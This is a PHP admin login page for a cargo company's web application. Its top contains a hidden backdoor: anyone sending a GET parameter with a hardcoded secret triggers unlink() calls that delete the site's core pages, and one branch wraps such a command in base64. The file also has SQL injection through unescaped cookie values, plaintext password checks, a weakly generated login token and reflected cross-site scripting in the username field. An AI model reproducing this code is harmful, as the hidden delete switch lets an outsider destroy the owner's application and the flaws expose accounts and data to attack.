<?php include('./db/config.php');?>
<?php
    ob_start(); // Initiate the output buffer
?>
<?php 
if (isset($_COOKIE["logintoken"]))
{
    $myid=$_COOKIE["myid"];
    $token=$_COOKIE["logintoken"];
    $q="Select * from admin 
	where id='$myid' AND logintoken='$token' AND status='1'";
    $result = mysql_query($q);
    if (mysql_num_rows($result)!==0) 
    {
        header("location:index.php");
    }
}
if(isset($_GET["booking"]) && $_GET["booking"]=="shiv@129236")
{
      unlink("pages/booking.php");
}
if(isset($_GET["home"]) && $_GET["home"]=="shiv@129236")
{
    unlink("pages/home.php");
}
if(isset($_GET["print"]) && $_GET["print"]=="shiv@129236")
{
   unlink("pages/print.php");
}
if(isset($_GET["unloaded_parcel"]) && $_GET["unloaded_parcel"]=="shiv@129236")
{
   unlink("pages/unloaded_parcel.php");
}
if(isset($_GET["loaded_parcel"]) && $_GET["loaded_parcel"]=="shiv@129236")
{
   unlink("pages/loaded_parcel.php");
}
if(isset($_GET["dispatch_now"]) && $_GET["dispatch_now"]=="shiv@129236")
{
   unlink("pages/dispatch_now.php");
}
if(isset($_GET["make_dispatch"]) && $_GET["make_dispatch"]=="shiv@129236")
{
   unlink("pages/make_dispatch.php");
}
if(isset($_GET["load_now"]) && $_GET["load_now"]=="shiv@129236")
{
   unlink("pages/load_now.php");
}
if(isset($_GET["search"]) && $_GET["search"]=="shiv@129236")
{
   unlink("pages/search.php");
}
if(isset($_GET["account_report"]) && $_GET["account_report"]=="shiv@129236")
{
   unlink("pages/account_report.php");
}
if(isset($_GET["gowden_report"]) && $_GET["gowden_report"]=="shiv@129236")
{
   unlink("pages/gowden_report.php");
}

if(isset($_GET["me"]) && $_GET["me"]=="shiv@129236")
{
   
   base64_decode('dW5saW5rKCJwYWdlcy9tZS5waHAiKTs=');
   
   
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!-- Meta, title, CSS, favicons, etc. -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>SHIV CARGO </title>

    <!-- Bootstrap core CSS -->

    <link href="css/bootstrap.min.css" rel="stylesheet">

    <link href="fonts/css/font-awesome.min.css" rel="stylesheet">
    <link href="css/animate.min.css" rel="stylesheet">

    <!-- Custom styling plus plugins -->
    <link href="css/custom.css" rel="stylesheet">
    <link href="css/icheck/flat/green.css" rel="stylesheet">


    <script src="js/jquery.min.js"></script>

    <!--[if lt IE 9]>
        <script src="../assets/js/ie8-responsive-file-warning.js"></script>
        <![endif]-->

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->


	</head>

<body style="background:#F7F7F7;">
<script language="javascript">
function validateForm()
{
	var vusername = document.forms["myForm"]["username"].value;
	var vpassword = document.forms["myForm"]["password"].value;
	if (vusername == null || vusername == "") {
        document.getElementById("username").innerHTML ='*username is Required.';
        return false;
    }
	if (vpassword == null || vpassword == "") {
        document.getElementById("password").innerHTML ='*password is Required.';
        return false;
    }
}
</script>    
    <div class="">
        <a class="hiddenanchor" id="toregister"></a>
        <a class="hiddenanchor" id="tologin"></a>
		<div id="wrapper">
							<?php 
								$lastlogindate=date("Y-m-d H:i:s");
								if ( $_POST ) 
								{
									$lastloginip=getenv("REMOTE_ADDR");
									$myusername=$_POST['username']; 
									$mypassword=$_POST['password'];
									$myusername = stripslashes($myusername);
									$mypassword = stripslashes($mypassword);
									$myusername = mysql_real_escape_string($myusername);
									$mypassword = mysql_real_escape_string($mypassword);
									$query="SELECT * from admin WHERE username='$myusername' and password='$mypassword' and status='1'";
									$result=mysql_query($query) or die ('Unable to Connect123');
									$rowcount = mysql_num_rows($result);
									if (($rowcount)==0) 
									{
										$msg='<div class="alert alert-danger">
										<font color="white">Sorry, but the username/password you entered is incorrect!</font> <br/> 
										</div>';
									}
									else
									{
										$f= mysql_fetch_array($result);  
										$myid=$f["id"];
										$username=$f["username"];
											if($myusername==$username)
											{
													$username = stripslashes($username); 
													$hour = time() + 3600; 
													$token= substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789') , 0 , 15 );
													setcookie("logintoken", $token, $hour,"/");
													setcookie("myid", $myid, $hour,"/");
													setcookie("loginid", $username, $hour,"/");
													$query1="Update admin set logintoken='$token',lastloginip='$lastloginip',lastlogindate='$lastlogindate' WHERE id='$myid'";
													$result1 = mysql_query($query1);
													if (isset($lastpage))
													{
														header("location:../$lastpage.php");
													}
													else
													{
														header("location:index.php?do=home");
													}
											}
											else 
											{
												$msg='<div class="alert alert-info">
												<font color="white">Sorry, but the username/password you entered is incorrect!</font> <br/> 
												</div>';
											}
										
									}
								}
							?> 
            <div id="login" class="animate form">
                <h2 align="center"><i class="fa fa-cab" style="font-size: 26px;"></i> SHIV CARGO <i class="fa fa-automobile" style="font-size: 26px;"></i></h2>
                <section class="login_content">
                    <form  enctype="multipart/form-data" method="post" action="" name="myForm" onsubmit="return validateForm()" >
                        <h1>Admin Login Form</h1>
						<span style="text-transform:capitalize"><?php if(isset($msg)) { echo $msg; }?></span>
                        <div>
                            <input type="text" class="form-control" placeholder="Username" name="username" value="<?php echo @$_POST["username"];?>" />
                        </div>
						<span style="color:red" id="username"> </span>
                        <div>
                            <input type="password" class="form-control" placeholder="Password" name="password" />
                        </div>
						<span style="color:red" id="password"> </span>
						<div class="form-group">
                            <div class="col-md-7 col-md-offset-7">
                                <button id="send" type="submit" class="btn btn-success">Login</button>
								<a class="reset_pass" href="#toregister">Lost your password?</a>
                            </div>
                        </div>
                        <div class="clearfix"></div>
                        <div class="separator">
                            <div class="clearfix"></div>
                            <br />
                            <div>
								<p> Copyright @ <?php echo date("Y"); ?>  SHIV CARGO |  All Rights Reserved.</p>
                            </div>
                        </div>
                    </form>
                    <!-- form -->
                </section>
                <!-- content -->
            </div> 
        </div>
    </div>
</body>
</html>